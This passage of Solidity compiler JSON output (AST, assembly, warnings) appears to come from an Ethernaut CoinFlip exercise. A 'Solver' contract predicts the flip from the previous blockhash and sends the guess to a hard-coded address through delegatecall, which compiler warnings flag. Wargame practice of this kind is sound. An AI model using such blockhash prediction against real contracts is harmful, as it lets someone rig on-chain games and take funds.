											"begin": 4348,
											"end": 4359,
											"name": "PUSH",
											"source": 1,
											"value": "74727920616761696E0000000000000000000000000000000000000000000000"
										},
										{
											"begin": 4344,
											"end": 4345,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 4336,
											"end": 4342,
											"name": "DUP3",
											"source": 1
										},
										{
											"begin": 4332,
											"end": 4346,
											"name": "ADD",
											"source": 1
										},
										{
											"begin": 4325,
											"end": 4360,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 4208,
											"end": 4367,
											"name": "POP",
											"source": 1
										},
										{
											"begin": 4208,
											"end": 4367,
											"name": "JUMP",
											"source": 1,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"solve()": "890d6908"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.7+commit.e28d00a7\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"solve\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"ethernaut.sol\":\"Solver\"},\"evmVersion\":\"london\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"ethernaut.sol\":{\"keccak256\":\"0x50e8f91c4c392e6f6eefe354880502aec3d4cddae75bf67e46393971783785e1\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://5b52042c0f20ede8d9cd4d9d4a5fff04a9282df67ec2048c16349dcf5c6a63d5\",\"dweb:/ipfs/QmUmMFmuCCQC34mwaD9FfesMBYUnNV74tNh3MNPg1aeS5X\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 84,
								"contract": "ethernaut.sol:Solver",
								"label": "FACTOR",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 87,
								"contract": "ethernaut.sol:Solver",
								"label": "contractAddr",
								"offset": 0,
								"slot": "1",
								"type": "t_address"
							},
							{
								"astId": 89,
								"contract": "ethernaut.sol:Solver",
								"label": "previous",
								"offset": 20,
								"slot": "1",
								"type": "t_bool"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_bool": {
								"encoding": "inplace",
								"label": "bool",
								"numberOfBytes": "1"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"errors": [
			{
				"component": "general",
				"errorCode": "2462",
				"formattedMessage": "Warning: Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.\n  --> ethernaut.sol:11:3:\n   |\n11 |   constructor() public {\n   |   ^ (Relevant source part starts here and spans across multiple lines).\n\n",
				"message": "Visibility for constructor is ignored. If you want the contract to be non-deployable, making it \"abstract\" is sufficient.",
				"severity": "warning",
				"sourceLocation": {
					"end": 350,
					"file": "ethernaut.sol",
					"start": 297
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "9302",
				"formattedMessage": "Warning: Return value of low-level calls not used.\n  --> ethernaut.sol:45:9:\n   |\n45 |         contractAddr.delegatecall(abi.encode(bytes4(keccak256(\"flip(bool)\")),whatToSend));\n   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n",
				"message": "Return value of low-level calls not used.",
				"severity": "warning",
				"sourceLocation": {
					"end": 1324,
					"file": "ethernaut.sol",
					"start": 1243
				},
				"type": "Warning"
			},
			{
				"component": "general",
				"errorCode": "6321",
				"formattedMessage": "Warning: Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.\n  --> ethernaut.sol:40:38:\n   |\n40 |     function solve() public returns (uint256) {\n   |                                      ^^^^^^^\n\n",
				"message": "Unnamed return variable can remain unassigned. Add an explicit return with value to all non-reverting code paths or name the variable.",
				"severity": "warning",
				"sourceLocation": {
					"end": 1066,
					"file": "ethernaut.sol",
					"start": 1059
				},
				"type": "Warning"
			}
		],
		"sources": {
			"ethernaut.sol": {
				"ast": {
					"absolutePath": "ethernaut.sol",
					"exportedSymbols": {
						"CoinFlip": [
							81
						],
						"Solver": [
							141
						]
					},
					"id": 142,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".7"
							],
							"nodeType": "PragmaDirective",
							"src": "33:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 81,
							"linearizedBaseContracts": [
								81
							],
							"name": "CoinFlip",
							"nameLocation": "124:8:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "e6f334d7",
									"id": 3,
									"mutability": "mutable",
									"name": "consecutiveWins",
									"nameLocation": "155:15:0",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "140:30:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 2,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "140:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 5,
									"mutability": "mutable",
									"name": "lastHash",
									"nameLocation": "183:8:0",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "175:16:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 4,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "175:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 8,
									"mutability": "mutable",
									"name": "FACTOR",
									"nameLocation": "204:6:0",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "196:94:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 6,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "196:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 7,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "213:77:0",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 15,
										"nodeType": "Block",
										"src": "318:32:0",
										"statements": [
											{
												"expression": {
													"id": 13,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 11,
														"name": "consecutiveWins",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "325:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"hexValue": "30",
														"id": 12,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "343:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "325:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 14,
												"nodeType": "ExpressionStatement",
												"src": "325:19:0"
											}
										]
									},
									"id": 16,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nameLocation": "-1:-1:-1",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 9,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "308:2:0"
									},
									"returnParameters": {
										"id": 10,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "318:0:0"
									},
									"scope": 81,
									"src": "297:53:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 79,
										"nodeType": "Block",
										"src": "405:398:0",
										"statements": [
											{
												"assignments": [
													24
												],
												"declarations": [
													{
														"constant": false,
														"id": 24,
														"mutability": "mutable",
														"name": "blockValue",
														"nameLocation": "420:10:0",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "412:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 23,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "412:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 34,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 31,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"expression": {
																			"id": 28,
																			"name": "block",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967292,
																			"src": "451:5:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_block",
																				"typeString": "block"
																			}
																		},
																		"id": 29,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "number",
																		"nodeType": "MemberAccess",
																		"src": "451:12:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"hexValue": "31",
																		"id": 30,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "466:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "451:16:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 27,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967291,
																"src": "441:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 32,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "441:27:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 26,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "433:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 25,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "433:7:0",
															"typeDescriptions": {}
														}
													},
													"id": 33,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "433:36:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "412:57:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 37,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 35,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "482:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 36,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "494:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "482:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 42,
												"nodeType": "IfStatement",
												"src": "478:53:0",
												"trueBody": {
													"id": 41,
													"nodeType": "Block",
													"src": "506:25:0",
													"statements": [
														{
															"expression": {
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"id": 38,
																	"name": "revert",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		4294967277,
																		4294967277
																	],
																	"referencedDeclaration": 4294967277,
																	"src": "515:6:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_revert_pure$__$returns$__$",
																		"typeString": "function () pure"
																	}
																},
																"id": 39,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "515:8:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_tuple$__$",
																	"typeString": "tuple()"
																}
															},
															"id": 40,
															"nodeType": "ExpressionStatement",
															"src": "515:8:0"
														}
													]
												}
											},
											{
												"expression": {
													"id": 45,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 43,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "539:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"id": 44,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "550:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "539:21:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 46,
												"nodeType": "ExpressionStatement",
												"src": "539:21:0"
											},
											{
												"assignments": [
													48
												],
												"declarations": [
													{
														"constant": false,
														"id": 48,
														"mutability": "mutable",
														"name": "coinFlip",
														"nameLocation": "575:8:0",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "567:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 47,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "567:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 52,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 51,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 49,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "586:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"id": 50,
														"name": "FACTOR",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 8,
														"src": "599:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "586:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "567:38:0"
											},
											{
												"assignments": [
													54
												],
												"declarations": [
													{
														"constant": false,
														"id": 54,
														"mutability": "mutable",
														"name": "side",
														"nameLocation": "617:4:0",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "612:9:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 53,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "612:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 61,
												"initialValue": {
													"condition": {
														"commonType": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"id": 57,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftExpression": {
															"id": 55,
															"name": "coinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 48,
															"src": "624:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "BinaryOperation",
														"operator": "==",
														"rightExpression": {
															"hexValue": "31",
															"id": 56,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "number",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "636:1:0",
															"typeDescriptions": {
																"typeIdentifier": "t_rational_1_by_1",
																"typeString": "int_const 1"
															},
															"value": "1"
														},
														"src": "624:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"falseExpression": {
														"hexValue": "66616c7365",
														"id": 59,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "647:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "false"
													},
													"id": 60,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"nodeType": "Conditional",
													"src": "624:28:0",
													"trueExpression": {
														"hexValue": "74727565",
														"id": 58,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "bool",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "640:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"value": "true"
													},
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "612:40:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"id": 64,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 62,
														"name": "side",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 54,
														"src": "665:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 63,
														"name": "_guess",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 18,
														"src": "673:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "665:14:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": {
													"id": 77,
													"nodeType": "Block",
													"src": "741:57:0",
													"statements": [
														{
															"expression": {
																"id": 73,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"id": 71,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "750:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"hexValue": "30",
																	"id": 72,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "768:1:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_0_by_1",
																		"typeString": "int_const 0"
																	},
																	"value": "0"
																},
																"src": "750:19:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 74,
															"nodeType": "ExpressionStatement",
															"src": "750:19:0"
														},
														{
															"expression": {
																"hexValue": "66616c7365",
																"id": 75,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "785:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "false"
															},
															"functionReturnParameters": 22,
															"id": 76,
															"nodeType": "Return",
															"src": "778:12:0"
														}
													]
												},
												"id": 78,
												"nodeType": "IfStatement",
												"src": "661:137:0",
												"trueBody": {
													"id": 70,
													"nodeType": "Block",
													"src": "681:54:0",
													"statements": [
														{
															"expression": {
																"id": 66,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "690:17:0",
																"subExpression": {
																	"id": 65,
																	"name": "consecutiveWins",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 3,
																	"src": "690:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 67,
															"nodeType": "ExpressionStatement",
															"src": "690:17:0"
														},
														{
															"expression": {
																"hexValue": "74727565",
																"id": 68,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "bool",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "723:4:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																},
																"value": "true"
															},
															"functionReturnParameters": 22,
															"id": 69,
															"nodeType": "Return",
															"src": "716:11:0"
														}
													]
												}
											}
										]
									},
									"functionSelector": "1d263f67",
									"id": 80,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "flip",
									"nameLocation": "365:4:0",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 18,
												"mutability": "mutable",
												"name": "_guess",
												"nameLocation": "375:6:0",
												"nodeType": "VariableDeclaration",
												"scope": 80,
												"src": "370:11:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 17,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "370:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "369:13:0"
									},
									"returnParameters": {
										"id": 22,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 21,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 80,
												"src": "399:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 20,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "399:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "398:6:0"
									},
									"scope": 81,
									"src": "356:447:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 142,
							"src": "115:691:0",
							"usedErrors": []
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 141,
							"linearizedBaseContracts": [
								141
							],
							"name": "Solver",
							"nameLocation": "819:6:0",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"id": 84,
									"mutability": "mutable",
									"name": "FACTOR",
									"nameLocation": "841:6:0",
									"nodeType": "VariableDeclaration",
									"scope": 141,
									"src": "833:94:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 82,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "833:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 83,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "850:77:0",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 87,
									"mutability": "mutable",
									"name": "contractAddr",
									"nameLocation": "942:12:0",
									"nodeType": "VariableDeclaration",
									"scope": 141,
									"src": "934:65:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_address",
										"typeString": "address"
									},
									"typeName": {
										"id": 85,
										"name": "address",
										"nodeType": "ElementaryTypeName",
										"src": "934:7:0",
										"stateMutability": "nonpayable",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										}
									},
									"value": {
										"hexValue": "307831623443334242363330353843453637623935373342456666634246333733376531363937463446",
										"id": 86,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "957:42:0",
										"typeDescriptions": {
											"typeIdentifier": "t_address",
											"typeString": "address"
										},
										"value": "0x1b4C3BB63058CE67b9573BEffcBF3737e1697F4F"
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 89,
									"mutability": "mutable",
									"name": "previous",
									"nameLocation": "1011:8:0",
									"nodeType": "VariableDeclaration",
									"scope": 141,
									"src": "1006:13:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bool",
										"typeString": "bool"
									},
									"typeName": {
										"id": 88,
										"name": "bool",
										"nodeType": "ElementaryTypeName",
										"src": "1006:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bool",
											"typeString": "bool"
										}
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 139,
										"nodeType": "Block",
										"src": "1068:296:0",
										"statements": [
											{
												"assignments": [
													95
												],
												"declarations": [
													{
														"constant": false,
														"id": 95,
														"mutability": "mutable",
														"name": "whatToSend",
														"nameLocation": "1084:10:0",
														"nodeType": "VariableDeclaration",
														"scope": 139,
														"src": "1079:15:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														},
														"typeName": {
															"id": 94,
															"name": "bool",
															"nodeType": "ElementaryTypeName",
															"src": "1079:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 110,
												"initialValue": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 109,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"components": [
															{
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 106,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"arguments": [
																		{
																			"arguments": [
																				{
																					"commonType": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					},
																					"id": 102,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"expression": {
																							"id": 99,
																							"name": "block",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 4294967292,
